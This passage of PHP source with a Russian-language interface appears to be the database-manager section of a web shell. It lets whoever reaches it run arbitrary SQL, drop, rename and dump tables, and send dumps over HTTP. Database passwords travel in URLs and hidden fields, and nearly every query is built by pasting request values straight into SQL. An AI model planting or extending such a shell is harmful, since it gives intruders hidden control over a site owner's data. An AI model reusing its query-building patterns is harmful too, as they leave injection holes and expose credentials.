"<form method=\"get\" action=\"$self\">".
"<input type=\"hidden\" name=\"s\" value=\"$s\"><input type=hidden name=sec value=mysql>
<input type=hidden name=workingdir value=".getcwd().">".
"<input type=\"hidden\" name=\"db\" value=\"$db\">".
"<input type=\"hidden\" name=\"new_tbl_name\" value=\"$new_tbl_name\">".
"<input type=\"hidden\" name=\"server\" value=\"$server\">".
"<input type=\"hidden\" name=\"port\" value=\"$port\">".
"<input type=\"hidden\" name=\"login\" value=\"$login\">".
"<input type=\"hidden\" name=\"passwd\" value=\"$passwd\">".
"<table align=center bgcolor=#181818 width=98% cellpadding=0 cellspacing=1 border=0><tr bgcolor=#181818><td valign=top>".
"<table cellpadding=2 bgcolor=#181818 width=100%>".
"<tr><td align=center><b>Создать новую таблицу</b> [ <font color=green><b>$new_tbl_name</b></font> ] <b>в базе</b> [ <font color=green><b>$db</b></font> ]<hr color=#FFFFFF></td></tr>".
"<tr><td align=center>".
"<table bgcolor=#181818 border=0 cellspacing=1 cellpadding=2 bgcolor=#181818 width=100%>".
"<tr align=center bgcolor=#181818><td><b>Поле</b></td><td><b>Тип</b></td><td><b>Длинна</b></td><td><b>Атрибуты</b></td><td><b>Ноль</b></td><td><b>По умолчанию</b></td><td><b>Дополнительно</b></td><td><b>Первичный</b></td><td><b>Индекс</b></td><td><b>Уник-oе</b></td><td><b>---</b></td></tr>";
print $pole_count;
print
"</table><br><b>Коментарий к таблице:</b> <input type=\"text\" name=\"comment\" size=\"40\" maxlength=\"80\">
&nbsp;&nbsp;&nbsp;&nbsp;<b>Тип таблицы:</b>
<select name=\"tbl_type\">
<option value=\"Default\">По умолчанию</option>
<option value=\"MYISAM\">MyISAM</option>
<option value=\"HEAP\">Heap</option>
<option value=\"MERGE\">Merge</option>
<option value=\"ISAM\">ISAM</option>
</select>&nbsp;&nbsp;&nbsp;&nbsp;
<input type=\"checkbox\" name=\"php_kod\" value=\"ok\"> Показать PHP-код запроса
</td></tr>".
"<tr><td align=center><br><input type=\"submit\" value=\"Выполнить запрос\"></td></tr>".
"</table>".
"</td></tr></table></form>";
}

if (isset($_REQUEST['field_name'])) {
for ($i=0; $i<count($field_name); $i++) {
if ($_REQUEST['field_name'][$i] !=='') {
$n_name .= "`$field_name[$i]` ";
if ($_REQUEST['field_length'][$i] !=='') {
$n_name .= "$field_type[$i]($field_length[$i]) ";
}else{
$n_name .= "$field_type[$i] ";
}

if ($_REQUEST['field_attribute'][$i] !=='') { $n_name .= "$field_attribute[$i] "; }
if ($_REQUEST['field_null'][$i] =='NOT NULL') { $n_name .= "$field_null[$i] "; }
if ($_REQUEST['field_default'][$i] !=='') { $n_name .= "DEFAULT '$field_default[$i]' "; }
if ($_REQUEST['field_extra'][$i] =='AUTO_INCREMENT') { $n_name .= "$field_extra[$i], "; }else{ $n_name .=', '; }
if ($_REQUEST['field_key_0'][$i] !=='no') { 
if ($_REQUEST['field_key_0'][$i] =='primary_0') {
$n_prim .= " `$field_name[$i]`, "; 
}

if ($_REQUEST['field_key_0'][$i] =='index_0') { 
$n_ind .= " `$field_name[$i]`, "; 
}

if ($_REQUEST['field_key_0'][$i] =='unique_0') { 
$n_uniq .= " `$field_name[$i]`, "; 
}
}
}
}

$n_name=substr_replace($n_name,"",-2);                     
if (count($n_prim)>0) {
$n_prim=substr_replace($n_prim,"",-2); 
$n_name .=", PRIMARY KEY ($n_prim)";
}

if (count($n_ind)) {
$n_ind=substr_replace($n_ind,"",-2); 
$n_name .=", INDEX ($n_ind)";
}

if (count($n_uniq)) {
$n_uniq=substr_replace($n_uniq,"",-2); 
$n_name .=", UNIQUE ($n_uniq)";
}

$sql_new_tbl = "CREATE TABLE `$new_tbl_name` ( $n_name )";
if ($_REQUEST['tbl_type'] !=='Default') {
$sql_new_tbl .= " TYPE =$tbl_type";
}

if ($_REQUEST['comment'] !=='') {
$sql_new_tbl .= " COMMENT = '$comment'";
}       

$r_n_tbl=mysql_db_query($db, $sql_new_tbl) or die("$h_error".mysql_error()."$f_error");
$t=base64_encode("<font color=green size=2><b>Action: </b></font><font color=#ffffff size=2>Таблица [ <b>$new_tbl_name</b> ] успешно создана.</font><br>");
if ($_REQUEST['php_kod']=='ok') { 
$t2=base64_encode("<br><table bgcolor=#EDEEF1 align=center width=98%><font color=green><b>PHP-код запроса:</b></font><tr><td>\$sql='$sql_new_tbl';</td></tr></table><br><br>");
}else{ $t2=''; }
print "<head><META HTTP-EQUIV='Refresh' CONTENT='0;url=$self?sec=mysql&workingdir=".getcwd()."&s=$s&db=$db&login=$login&passwd=$passwd&server=$server&port=$port&t=$t&t2=$t2'></head>";
} 

if ($_REQUEST['q_tbl']=='bd') { $q_bd="SHOW TABLE STATUS "; }
if ($_REQUEST['return_sql']=='ok') { $q_bd=trim($_REQUEST['new_query_bd']);}
$form_query_db="<br>
<form method=\"post\" action=\"$self?sec=mysql&workingdir=".getcwd()."&s=$s&db=$db&server=$server&port=$port&login=$login&passwd=$passwd\">
<table align=center width=90% border=0 bgcolor=#181818><tr><td>Выполнить произвольный запрос к базе ( <b>$db</b> )</td></tr>
<tr><td width=90>
<textarea name=\"new_query_bd\" rows=\"10\" cols=\"80\">$q_bd</textarea>
</td><td valign=top>
<input type=\"checkbox\" name=\"php_kod\" value=\"ok\"> Показать PHP-код запроса<br><br>
<input type=\"checkbox\" name=\"return_sql\" value=\"ok\" checked=\"checked\"> Показать данный запрос снова<br>
<br>
<a href=\"$self?sec=mysql&workingdir=".getcwd()."&s=$s&q_help=ok\" target=\"_blank\"><b>Примеры запросов</b></a>
</td></tr>
<tr><td>
<input type=\"submit\" value=\"запрос\">
</td></tr>
</table></form>";

if (isset($db) && $_REQUEST['q_tbl']=='bd') { 
print $form_query_db; 
}

if (isset($_REQUEST['new_query_bd'])) { 
$_REQUEST['new_query_bd']=trim($_REQUEST['new_query_bd']);
print $form_query_db;
if ($_REQUEST['php_kod']=='ok') { 
print "&nbsp;&nbsp;&nbsp;<font color=green><b>PHP-код запроса:</b></font><br>&nbsp;&nbsp;&nbsp;\$sql=\"".$_REQUEST['new_query_bd']."\";<br><br>";
}

$r_q_bd=mysql_db_query($db, $_REQUEST['new_query_bd']) or die("$h_error".mysql_error()."$f_error");
print "&nbsp;&nbsp;&nbsp;<b>Запрос успешно выполнен<b>";
if ($r_q_bd !=='') {
print "<table align=center width=98% bgcolor=#D7D8DA>";
while ($line_bd = @mysql_fetch_array($r_q_bd, MYSQL_ASSOC)) {
print "<tr>";
foreach ($line_bd as $key_bd =>$col_value_bd) {          
print "<td bgcolor=#181818>".htmlspecialchars($col_value_bd)."</td>";
}

print "</tr>";
}

print "</table><br>";
@mysql_free_result($r_q_bd);
}
} 

if (isset($drop_table) && isset($db)){ 
mysql_select_db($db) or die("$h_error<b>".mysql_error()."</b>$f_error"); 
$query = "DROP TABLE IF EXISTS $drop_table";
$result = mysql_query($query) or die("$h_error<b>".mysql_error()."</b>$f_error");
$t=base64_encode("<font color=green size=2><b>Action: </b></font><font color=#ffffff size=2>Таблица [ <b>$drop_table </b>] успешно удалена.</font><br>");
print "<head><META HTTP-EQUIV='Refresh' CONTENT='0;url=$self?sec=mysql&workingdir=".getcwd()."&s=$s&db=$db&login=$login&passwd=$passwd&server=$server&port=$port&t=$t'></head>";
unset($drop_table);
}

if (isset($q_i)) { $n_img($tag,$f_n,$img_c); }
if (isset($db) && isset($tbl)) {
$count=mysql_query ("SELECT COUNT(*) FROM $tbl");
$count_row= mysql_fetch_array($count);
mysql_free_result($count);
print "<table border=0 align=center width=100% cellpadding=0 cellspacing=0>
<tr> 
<td>
<table align=center border=0 width=700 cellpadding=0 cellspacing=1 bgcolor=#181818>
<tr align=center>                      
<td width=100 bgcolor=#181818>
<a href=\"$_SERVER[PHP_SELF]?sec=mysql&workingdir=".getcwd()."&s=$s&db=$db&tbl=$tbl&st_tab=TRUE&login=$login&passwd=$passwd&server=$server&port=$port\" title=\"Показать структуру $tbl\"><b>Структура</b></a>
</td>
<td width=100 bgcolor=#181818>
<a href=\"$_SERVER[PHP_SELF]?sec=mysql&workingdir=".getcwd()."&s=$s&db=$db&tbl=$tbl&login=$login&passwd=$passwd&server=$server&port=$port&nn_row=ok\" title=\"Вставить новый ряд в таблицу $tbl\"><b>Вставить</b></a>
</td>
<td width=120 bgcolor=#181818>
<a href=\"$_SERVER[PHP_SELF]?sec=mysql&workingdir=".getcwd()."&s=$s&db=$db&tbl=$tbl&login=$login&passwd=$passwd&server=$server&port=$port&query_tbl&q_tbl=table\" title=\"Произвольный SQL запрос\"><b>SQL-запрос</b></a>
</td>
<td width=120 bgcolor=#181818>
<a href=\"$_SERVER[PHP_SELF]?sec=mysql&workingdir=".getcwd()."&s=$s&login=$login&passwd=$passwd&server=$server&port=$port&db=$db&tbl=$tbl&dump=tab\" title=\"Экспорт данных таблицы $tbl\"><b>Дамп таблицы</b></a>
</td>
<td width=120 bgcolor=#181818>
<a href=\"$_SERVER[PHP_SELF]?sec=mysql&workingdir=".getcwd()."&s=$s&login=$login&passwd=$passwd&server=$server&port=$port&db=$db&tbl=$tbl&alter_table=TRUE\" title=\"Переименовать таблицу $tbl\"><b>Переименовать</b></a>
</td>
<td width=120 bgcolor=#181818>
<a href=\"$_SERVER[PHP_SELF]?sec=mysql&workingdir=".getcwd()."&s=$s&db=$db&drop_table=$tbl&login=$login&passwd=$passwd&server=$server&port=$port\" title=\"Удалить таблицу $tbl\" onClick=\"return confirm('Удалить таблицу $tbl ?')\";><b>Удалить таблицу</b></a>
</td>
</tr>
</table> 
</td>
</tr>
<tr>
<td><br>";

if (isset($t)) { print "&nbsp;&nbsp;".base64_decode($t);}
print "&nbsp;&nbsp;БД:(<b>$db</b>)&nbsp;&nbsp;&nbsp;&nbsp;Таблица:(<b>$tbl</b>)&nbsp;&nbsp;&nbsp;
Всего строк:(<b>$count_row[0]</b>)
</td>
</tr>
<tr>
<td> 
<table border=0 width=100% cellpadding=4 cellspacing=0 bgcolor=#181818>
<tr>
<td bgcolor=#181818 align=center valign=center>";
$start=$limit_start+$limit_count;
if (isset($start) && ($start>0)) {
print "<table align=center border=0 cellpadding=4 cellspacing=0>
<tr>";
if ($start+$limit_count >= $count_row[0]){
$start=$limit_start;
$limit_count=$count_row[0]-$start;
}

if (isset($start) && ($limit_start >= 30) ){
$back=$limit_start-30;
print "<form method=\"get\" action=\"$self\">
<td bgcolor=#181818 align=center>
<input type=hidden name=sec value=mysql>
<input type=hidden name=workingdir value=".getcwd().">
<input type=\"hidden\" name=\"server\" value=\"$server\">
<input type=\"hidden\" name=\"port\" value=\"$port\">
<input type=\"hidden\" name=\"login\" value=\"$login\">
<input type=\"hidden\" name=\"passwd\" value=\"$passwd\">
<input type=\"hidden\" name=\"db\" value=\"$db\">
<input type=\"hidden\" name=\"s\" value=\"$s\">
<input type=\"hidden\" name=\"tbl\" value=\"$tbl\">
<input type=\"hidden\" name=\"limit_start\" value=\"$back\">
<input type=\"hidden\" name=\"limit_count\" value=\"30\">
<input type=\"submit\" value=\"<< назад(30)\">&nbsp;&nbsp;
</td></form>";
}

print " <form method=\"get\" action=\"$self\">
<td bgcolor=#181818 align=center>
<input type=hidden name=sec value=mysql>
<input type=hidden name=workingdir value=".getcwd().">
<input type=\"hidden\" name=\"server\" value=\"$server\">
<input type=\"hidden\" name=\"port\" value=\"$port\">
<input type=\"hidden\" name=\"login\" value=\"$login\">
<input type=\"hidden\" name=\"passwd\" value=\"$passwd\">
<input type=\"hidden\" name=\"db\" value=\"$db\">
<input type=\"hidden\" name=\"s\" value=\"$s\">
<input type=\"hidden\" name=\"tbl\" value=\"$tbl\">
<input type=\"submit\" value=\"показать\">&nbsp;&nbsp;от
<input type=\"text\" name=\"limit_start\" value=\"$start\" size=\"5\" maxlength=\"5\">строки
&nbsp;&nbsp; <input type=\"text\" name=\"limit_count\" value=\"$limit_count\" size=\"5\" maxlength=\"5\">строк таблицы
</td></form>";

if ( isset($limit_start) && ($start <= $count_row[0]) ){
print "<form method=\"get\" action=\"$self\">
<td bgcolor=#181818 align=center>
<input type=hidden name=sec value=mysql>
<input type=hidden name=workingdir value=".getcwd().">
<input type=\"hidden\" name=\"server\" value=\"$server\">
<input type=\"hidden\" name=\"port\" value=\"$port\">
<input type=\"hidden\" name=\"login\" value=\"$login\">
<input type=\"hidden\" name=\"passwd\" value=\"$passwd\">
<input type=\"hidden\" name=\"s\" value=\"$s\">
<input type=\"hidden\" name=\"db\" value=\"$db\">
<input type=\"hidden\" name=\"tbl\" value=\"$tbl\">
<input type=\"hidden\" name=\"limit_start\" value=\"$start\">
<input type=\"hidden\" name=\"limit_count\" value=\"30\">
<input type=\"submit\" value=\"вперед(30)>>\">
</td></form>";
}

print "</tr></form></table>";
}

if ($alter_table=="TRUE"){
print " <form method=\"get\" action=\"$self\">
<input type=hidden name=sec value=mysql>
<input type=hidden name=workingdir value=".getcwd().">
<input type=\"hidden\" name=\"s\" value=\"$s\">
<input type=\"hidden\" name=\"server\" value=\"$server\">
<input type=\"hidden\" name=\"port\" value=\"$port\">
<input type=\"hidden\" name=\"login\" value=\"$login\">
<input type=\"hidden\" name=\"passwd\" value=\"$passwd\">
<input type=\"hidden\" name=\"db\" value=\"$db\">
<input type=\"hidden\" name=\"tbl\" value=\"$tbl\">
<input type=\"hidden\" name=\"alter_table\" value=\"$alter_table\">
<table border=0 cellpadding=4 cellspacing=1 bgcolor=#181818>
<tr><td bgcolor=#181818 align=center><font size=2>Переименовать таблицу [ <b>$tbl</b> ]</font></td></tr>
<tr><td bgcolor=#181818>Новое имя таблицы:
<input type=\"text\" name=\"alttbl\" value=\"\">
<input type=\"submit\" value=\"переименовать\" onClick=\"return confirm('Вы уверены, что хотите переименовать таблицу \' $tbl \' ?')\";>
</td></tr></table></form>";
}

if (isset($alttbl)){
mysql_select_db($db) or die("$h_error<b>".mysql_error()."</b>$f_error");
$query = "ALTER TABLE $tbl RENAME TO $alttbl";
$result = mysql_query($query) or die("$h_error<b>".mysql_error()."</b>$f_error"); 
$t=base64_encode("<font color=green size=2><b>Action: </b></font><font color=#ffffff size=2>Таблица [ <b>$tbl ]</b> переименована в [ <b>$alttbl</b> ]</font><br>");
print "<head><META HTTP-EQUIV='Refresh' CONTENT='0;url=$self?sec=mysql&workingdir=".getcwd()."&s=$s&db=$db&login=$login&passwd=$passwd&server=$server&port=$port&tbl=$alttbl&limit_start=0&limit_count=5&t=$t'></head>";
}

if (isset($st_tab) && $st_tab=='TRUE'){
mysql_select_db($st_db);
$result = mysql_query('desc '.$tbl, $connection); 
print "<br><center><font size=2>Структура таблицы [ <b>$tbl</b> ]</font><center>".

"<table align=center border=0 cellpadding=2 cellspacing=1 width=700 bgcolor=#ffffff>";
for ($i=0;$i<@mysql_num_fields($result);$i++){
$name=mysql_field_name($result,$i);
$name=eregi_replace("Field","Поле",trim($name));
$name=eregi_replace("Type","Тип",trim($name));
$name=eregi_replace("Null","Ноль",trim($name));
$name=eregi_replace("Key","Индексы",trim($name));
$name=eregi_replace("Default","По умолчанию",trim($name));
$name=eregi_replace("Extra","Дополнительно",trim($name));
$nn .= "<td align=center bgcolor=#181818><b>$name</b></td>";   
} 

print "<tr>$nn</tr>";
while ($l_tbl = @mysql_fetch_array($result, MYSQL_ASSOC)) {      
print "<tr bgcolor=#181818>";
foreach ($l_tbl as $k_tbl =>$col_v_tbl) {          

if (strtoupper(substr($col_v_tbl, 0, 3)) === 'PRI') {
$col_v_tbl="Первичный";
}

if (strtoupper(substr($col_v_tbl, 0, 3)) === 'UNI') {
$col_v_tbl="Уникальный";
}

if (strtoupper(substr($col_v_tbl, 0, 3)) === 'MUL' && $col_v_tbl !=='') {
$col_v_tbl="Индекс";
}

if (strtoupper(substr($col_v_tbl, 0, 3)) === 'YES') { $col_v_tbl="Да"; }
if (eregi("Field", $k_tbl)) { 
print "<td><font color=green><b>".htmlspecialchars($col_v_tbl)."</b></font></td>";
}elseif (eregi("Type", $k_tbl)) { 
print "<td align=left>".htmlspecialchars($col_v_tbl)."</td>";
}else{
print "<td align=center>".htmlspecialchars($col_v_tbl)."</td>";             
}
}

print "</tr>";
}

print "</table><br>";
@mysql_free_result($result);
}

if ($_REQUEST['q_tbl']=='table') { $q_tbl="SELECT * FROM `$tbl` WHERE 1 LIMIT 0, 30"; }
if ($_REQUEST['return_sql']=='ok') { $q_tbl=trim($_REQUEST['new_query_tbl']); }
$form_query_db_tbl="<br>
<form method=\"get\" action=\"$self\">
<input type=hidden name=sec value=mysql>
<input type=hidden name=workingdir value=".getcwd().">
<input type=\"hidden\" name=\"s\" value=\"$s\">                
<input type=\"hidden\" name=\"db\" value=\"$db\">
<input type=\"hidden\" name=\"tbl\" value=\"$tbl\">
<input type=\"hidden\" name=\"server\" value=\"$server\">
<input type=\"hidden\" name=\"port\" value=\"$port\">
<input type=\"hidden\" name=\"login\" value=\"$login\">
<;input type=\"hidden\" name=\"passwd\" value=\"$passwd\">
<table width=90% border=0 bgcolor=#181818><tr><td>Выполнить произвольный запрос к таблице ( <b>$tbl</b> )</td></tr>
<tr><td width=90>
<textarea name=\"new_query_tbl\" rows=\"10\" cols=\"80\">$q_tbl</textarea>
</td><td valign=top>
<input type=\"checkbox\" name=\"php_kod\" value=\"ok\"> Показать PHP-код запроса<br><br>
<input type=\"checkbox\" name=\"return_sql\" value=\"ok\" checked=\"checked\"> Показать данный запрос снова<br>
<br>
<a href=\"$self?sec=mysql&workingdir=".getcwd()."&s=$s&q_help=ok\" target=\"_blank\"><b>Примеры запросов</b></a>
</td></tr>
<tr><td>
<input type=\"submit\" value=\"запрос\">
</td></tr>
</table></td></form>";

if (isset($_REQUEST['query_tbl']) || $_REQUEST['q_tbl']=='table') { 
print $form_query_db_tbl."<br>"; 
}

if (isset($new_query_tbl)) {
$new_query_tbl=trim($new_query_tbl);
print $form_query_db_tbl;
$result_tbl = mysql_query($new_query_tbl) or die("$h_error<b>".mysql_error()."</b>$f_error");
if ($result_tbl !=='') {
print " 
<table align=center border=0 width=90% cellpadding=0 cellspacing=1 bgcolor=#181818><tr>";

if ($_REQUEST['php_kod']=='ok') { print "<font color=green><b>PHP-код запроса:</b></font><br>\$sql = \"$new_query_tbl\";<br><br>"; }
if (preg_match("[drop]",$new_query)) { print "Таблица удалена, обновите список таблиц базы."; }
print "<br><b>Запрос успешно выполнен</b><br>";
for ($i=0;$i<@mysql_num_fields($result_tbl);$i++){
$name_tbl=mysql_field_name($result_tbl,$i);
print "<td bgcolor=#181818>$name_tbl</td>";   
} 

print "</tr>";
while ($line_tbl = @mysql_fetch_array($result_tbl, MYSQL_ASSOC)) {
print "<tr>";
foreach ($line_tbl as $key_tbl =>$col_value_tbl) {          
print "<td bgcolor=#181818>".htmlspecialchars($col_value_tbl)."</td>";
}

print "</tr>";
}

print "</table><br>";
@mysql_free_result($result_tbl);
}
}

if (!isset($alter_table) && !isset($st_tab) && !isset($query_tbl) && !isset($new_query_tbl) && 
!isset($dump) && !isset($strukt) && !isset($query_edit) && !isset($query_del) && !isset($q_get) && 
!isset($nn_row) && !isset($nn) && !isset($upd_f)) {
print "<br><table border=0 cellpadding=1 cellspacing=1 width=100% bgcolor=#181818><tr>";
$query_ind = 'SHOW KEYS FROM '.$tbl;
$result_ind = mysql_query($query_ind) or die("$h_error<b>".mysql_error()."</b>$f_error");
while ($row = mysql_fetch_array($result_ind, MYSQL_ASSOC)) {
if ($row['Key_name'] == 'PRIMARY') {
$primary[] .= $row['Column_name'];
} 
}

mysql_free_result($result_ind);
$query = "SELECT * FROM $tbl LIMIT $limit_start,$limit_count";
$result = mysql_query($query) or die("$h_error<b>".mysql_error()."</b>$f_error");
if (mysql_num_rows($result) == 0) {
print "Таблица <b>$tbl</b> не содержит ни одной записи";
}else{
print "<td bgcolor=#181818></td><td bgcolor=#181818></td>";
for ($i=0;$i<mysql_num_fields($result);$i++){
$name=mysql_field_name($result,$i);
print "<td bgcolor=#181818>$name</td>";   
} 
}

while ($line = mysql_fetch_array($result, MYSQL_ASSOC)) {
print "</tr>";
foreach ($line as $key =>$col_value) {
if (count($primary) > 0) { 
if (in_array($key,$primary)) { $edit .= urlencode("`$key`='$col_value' AND "); } 
} 

else {
$edit .= urlencode("`$key`='$col_value' AND ");
} 

$string .= "<td bgcolor=#181818>".htmlspecialchars($col_value)."</td>";
}

$edit=substr_replace($edit,"",-5);
print "<tr><td bgcolor=#181818 width=25><a href=$self?sec=mysql&workingdir=".getcwd()."&query_edit=$edit&s=y&login=$login&passwd=$passwd&server=$server&port=$port&db=$db&tbl=$tbl title=\"Редактировать значения колонок\">Edit</a></td>".
"<td bgcolor=#F84C6C width=25><a href=$self?sec=mysql&workingdir=".getcwd()."&query_del=$edit&s=y&login=$login&passwd=$passwd&server=$server&port=$port&db=$db&tbl=$tbl title=\"Удалить запись\" onClick=\"return confirm('Удалить запись, уверены ?')\";>Del</a></td>".
$string."</tr>";
unset($edit);
unset($string);
}

mysql_free_result($result);
print "</table><br>";
}

if (isset($query_del)) {

$query = 'DELETE FROM '.$tbl.' WHERE '.urldecode($query_del);

$r_del = mysql_query($query) or die("$h_error<b>".mysql_error()."</b>$f_error");

print "Успешно удалено строк (<b> ".mysql_affected_rows()."</b> )";

}

if (isset($query_edit)) {

$query = 'SELECT * FROM '.$tbl.' WHERE '.urldecode($query_edit);

$r_edit = mysql_query($query) or die("$h_error<b>".mysql_error()."</b>$f_error"); 

print "<br><center><font color=green><h5>Редактирование значений полей таблицы</h5></font></center>".

"<table border=0 cellpadding=1 cellspacing=1 bgcolor=#181818><tr bgcolor=#181818>".

"<td align=center><b>Поле</b></td><td align=center><b>Значение</b></td></tr>";

print   "<form method=\"get\" action=\"$self\">".

"<input type=\"hidden\" name=\"s\" value=\"$s\"><input type=hidden name=sec value=mysql>

<input type=hidden name=workingdir value=".getcwd().">".

"<input type=\"hidden\" name=\"q_get\" value=\"y\">".

"<input type=\"hidden\" name=\"server\" value=\"$server\">".

"<input type=\"hidden\" name=\"port\" value=\"$port\">".

"<input type=\"hidden\" name=\"login\" value=\"$login\">".

"<input type=\"hidden\" name=\"passwd\" value=\"$passwd\">".

"<input type=\"hidden\" name=\"db\" value=\"$db\">".

"<input type=\"hidden\" name=\"tbl\" value=\"$tbl\">";

print "<input type=\"radio\" name=\"up_str\" value=\"up_ok\" checked=\"checked\">Обновить значения&nbsp;&nbsp;<b>ИЛИ</b>&nbsp;&nbsp;&nbsp;".

"<input type=\"radio\" name=\"up_str\" value=\"ins_ok\">Вставить новый ряд<br><br>";

while ($line = mysql_fetch_array($r_edit, MYSQL_ASSOC)) {

foreach ($line as $key =>$col_value) {

$del_str_с .= "`$key`='$col_value' AND ";

$len_value=strlen($col_value);

if ($len_value > 40) { $t_value="<textarea name=$key cols=39 rows=5>$col_value</textarea>"; }

else { $t_value="<input type='text' name='$key' value='$col_value'size=40>"; }

$g_query .= "<tr><td bgcolor=#181818><b>$key</b></td><td>$t_value</td></tr>";

}

}

$del_str=urlencode($del_str_с);

print "<input type=\"hidden\" name=\"del_str\" value=\"$del_str\">";

print "$g_query</table><br>";

print "<br><input type=submit value=\"изменить значение\"></form>";

}

if (isset($q_get)) {

$url=$HTTP_SERVER_VARS['QUERY_STRING'];

if ($_REQUEST['up_str']=='up_ok') {

$del_str=urldecode(substr_replace($del_str,"",-5));

$b = explode('&', $url);

for ($i = 10; $i < count($b); $i++) {

$q = explode("=",$b[$i]);

$q_a .= "`".$q[0]."`='".$q[1]."', ";

}

$q_a_ins=urldecode(substr_replace($q_a,"",-2));

$q_st=urldecode(substr_replace($q_st,"",-2));

$up="UPDATE `$tbl` SET $q_a_ins WHERE $del_str LIMIT 1";

$q_ins_new = mysql_query($up) or die("$h_error<b>".mysql_error()."</b>$f_error");

$c_a_r=mysql_affected_rows();

print "<table align=left width=70% bgcolor=#181818><tr><td><font color=green>".

"<b>PHP-код запроса:</b></font></td></tr><tr><td>\$sql=\"$up\";</td>".

"</tr><tr><td><font color=green>Изменено строк</font> (<b>$c_a_r<b>)</td></tr></table>";

}

if ($_REQUEST['up_str']=='ins_ok') {

$b = explode('&', $url);

for ($i = 10; $i < count($b); $i++) {

$q = explode("=",$b[$i]);

$i_cols .="`$q[0]`, ";

$i_val .= "'$q[1]', ";

}

$i_cols=urldecode(substr_replace($i_cols,"",-2));

$q_a_ins=urldecode(substr_replace($i_val,"",-2));

$up="INSERT INTO `$tbl` ($i_cols) VALUES ($q_a_ins)";

$q_ins_new = mysql_query($up) or die("$h_error<b>".mysql_error()."</b>$f_error");

$c_a_r=mysql_affected_rows();

print "<table align=left width=70% bgcolor=#181818><tr><td><font color=green>".

"<b>PHP-код запроса:</b></font></td></tr><tr><td>\$sql=\"$up\";</td>".

"</tr><tr><td><font color=green>Изменено строк</font> (<b>$c_a_r<b>)</td></tr></table>";

}

}

if (isset($nn_row) && $_REQUEST['nn_row']=='ok') {

$nn_q = 'SHOW FIELDS FROM '.$tbl;

$r_n = mysql_query($nn_q) or die("$h_error<b>".mysql_error()."</b>$f_error");

print "<form method=\"get\" action=\"$self\">".

"<input type=\"hidden\" name=\"s\" value=\"$s\"><input type=hidden name=sec value=mysql>

<input type=hidden name=workingdir value=".getcwd().">".

"<input type=\"hidden\" name=\"nn\" value=\"ok\">".

"<input type=\"hidden\" name=\"server\" value=\"$server\">".

"<input type=\"hidden\" name=\"port\" value=\"$port\">".

"<input type=\"hidden\" name=\"login\" value=\"$login\">".

"<input type=\"hidden\" name=\"passwd\" value=\"$passwd\">".

"<input type=\"hidden\" name=\"db\" value=\"$db\">".

"<input type=\"hidden\" name=\"tbl\" value=\"$tbl\">".

"<br><center><font size=2>Вставить новый ряд в таблицу [ <b>$tbl</b> ]</font></center>".        

"<br><table border=0 cellpadding=0 cellspacing=1 bgcolor=#181818><tr bgcolor=#181818>".

"<td align=center><b>Поле</b></td><td align=center><b>Тип</b></td>".

"<td align=center><b>Значение</b></td></tr>";

while ($n_line = mysql_fetch_array($r_n, MYSQL_ASSOC)) {

foreach ($n_line as $n_k =>$n_v) {

$pole .= "$n_v ";

}

$n_l=explode(" ",$pole);

print "<tr bgcolor=#181818><td>&nbsp;<b>$n_l[0]</b>&nbsp;</td><td bgcolor=#181818>&nbsp;".

wordwrap($n_l[1],40,"<br>",1).

"&nbsp;</td><td><input type=text name=\"$n_l[0]\" size=35><td></tr>";             

unset($pole); 

}

print "</table><br><center><input type=submit value=\"вставить новый ряд\"></center></form><br>";

}

if (isset($nn) && $_REQUEST['nn']=='ok') {

$url_n=urldecode($HTTP_SERVER_VARS['QUERY_STRING']);

$b_nn = explode('&', $url_n);

for ($i = 8; $i < count($b_nn); $i++) {

$q_nn = explode("=",$b_nn[$i]);

$q_a_nn .= "`".$q_nn[0]."` ,";        

$q_nn_v .= "'".$q_nn[1]."' ,";

}

$q_nn_ins=urldecode(substr_replace($q_a_nn,"",-2));

$q_nn_v=substr_replace($q_nn_v,"",-2);

$sql_n="INSERT INTO `$tbl` ( $q_nn_ins ) VALUES ( $q_nn_v )";

mysql_query($sql_n) or die("$h_error<b>".mysql_error()."</b>$f_error");

$c_n_r=mysql_affected_rows();

print "&nbsp;&nbsp;&nbsp;<table align=left width=70% bgcolor=#181818>".

"<tr><td><b>Action:</b> <font color=green>Успешно вставлено строк</font> (<b>$c_n_r<b>)</td></tr>".

"<tr><td><font color=green><b>PHP-код запроса:</b></font></td></tr><tr><td>\$sql=\"$sql_n\";</td></tr></table><br><br>";

}

$form_dump=

"<form method=\"get\" action=\"$self\">".

"<input type=\"hidden\" name=\"s\" value=\"$s\"><input type=hidden name=sec value=mysql>

<input type=hidden name=workingdir value=".getcwd().">".

"<input type=\"hidden\" name=\"db\" value=\"$db\">".

"<input type=\"hidden\" name=\"tbl\" value=\"$tbl\">".

"<input type=\"hidden\" name=\"server\" value=\"$server\">".

"<input type=\"hidden\" name=\"port\" value=\"$port\">".

"<input type=\"hidden\" name=\"login\" value=\"$login\">".

"<input type=\"hidden\" name=\"passwd\" value=\"$passwd\">".

"<input type=\"hidden\" name=\"f_dump\" value=\"$file\">".

"<table bgcolor=#181818 width=400 cellpadding=0 cellspacing=1 border=0><tr bgcolor=#181818><td valign=top>".

"<table cellpadding=2 bgcolor=#181818 width=100%>".

"<tr><td align=center><b>Dump таблицы</b> [ <font color=green><b>$tbl</b></font> ]</td></tr>".

"<tr><td><input type=\"radio\" name=\"strukt\" value=\"t_strukt\"> Только структуру</td></tr>".

"<tr><td><input type=\"radio\" name=\"strukt\" value=\"d\"> Только данные</td></tr>".

"<tr><td><input type=\"radio\" name=\"strukt\" value=\"d_strukt\" checked=\"checked\"> Структуру и данные</td></tr>".

"<tr><td align=center><hr size=1 color=#181818><b>Действие</b> (показать/отправить)</td></tr>".

"<tr><td><input type=\"radio\" name=\"send\" value=\"send_br\" checked=\"checked\"> Показать в броузере</td></tr>".

"<tr><td><input type=\"radio\" name=\"send\" value=\"send_http\"> Отправить файл дампа по HTTP</td></tr>".

"<tr><td align=center><br><input type=\"submit\" value=\"Выполнить запрос\"></td></tr>".

"</table>".

"</td></tr></table></form>";

if ($dump=="tab"){ print $form_dump;}

if ($_REQUEST['strukt']=='t_strukt' && $_REQUEST['send']=='send_br' ){

$host = $HTTP_SERVER_VARS["SERVER_NAME"];

$ip = $HTTP_SERVER_VARS["SERVER_ADDR"];

mysql_select_db($db) or die("$h_error<b>".mysql_error()."</b>$f_error");

$fp = fopen($file, "w"); 

fputs ($fp, "# Host settings:\n# $host ($ip)\n# MySQL version: (".mysql_get_server_info().")\n# Date: ".

date("F j, Y, g:i a")."\n# "." dump db \"".$db."\" table \"".$tbl."\"\n#_________________________________________________________\n\n"); 

